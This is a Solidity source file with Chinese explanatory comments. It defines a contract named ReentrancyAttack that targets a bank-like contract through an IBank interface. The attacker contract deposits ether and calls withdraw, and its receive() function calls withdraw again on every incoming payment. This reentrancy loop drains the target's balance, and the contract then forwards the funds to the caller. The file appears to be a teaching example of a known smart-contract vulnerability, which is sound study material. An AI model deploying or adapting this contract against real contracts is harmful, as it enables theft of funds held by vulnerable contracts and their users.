//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.12;
//这段代码定义了一个名为 IBank 的接口（interface）其中包含两个函数：deposit 和 withdraw。

// 导入接口文件
interface IBank {
    function deposit() external payable;

    function withdraw() external;
}

contract ReentrancyAttack {
    //声明了一个名为 bank 的变量，其类型为 IBank
    //IBank bank; 表示 ReentrancyAttack 合约中的一个属性 bank，
    //它用来引用另一个实现了 IBank 接口的合约的实例。通过这种方式，
    //ReentrancyAttack 可以与其他合约进行交互，并调用 IBank 接口中定义的函数
    IBank bank;

    constructor(address _bank) {
        //_bank，并将其转换为 IBank 类型，然后将其赋值给 bank 变量
        //这样ReentrancyAttack 合约就可以使用 bank 变量来调用 IBank 接口中定义的函数
        bank = IBank(_bank);
    }
    //调用 bank 合约的 deposit() 函数，并向该函数发送当前函数接收到的以太币数量作为支付
    function doDeposit() external payable {
        //{value: msg.value}它表示当前函数接收到的以太币数量
        //并向该函数发送当前函数接收到的以太币数量作为支付
        bank.deposit{value: msg.value}();
    }
    //
    function doWithdraw() external {
        bank.withdraw();
        //将当前合约（address(this)）的余额（balance）通过 transfer 函数发送到 msg.sender 所代表的地址
        //payable(。。。) 将接收到的值转换为一个可支付的地址
        payable(msg.sender).transfer(address(this).balance);
    }
    //当合约接收到以太币时如果没有调用指定函数,则会调用 receive() 函数
    receive() external payable {
        bank.withdraw();
    }
    
}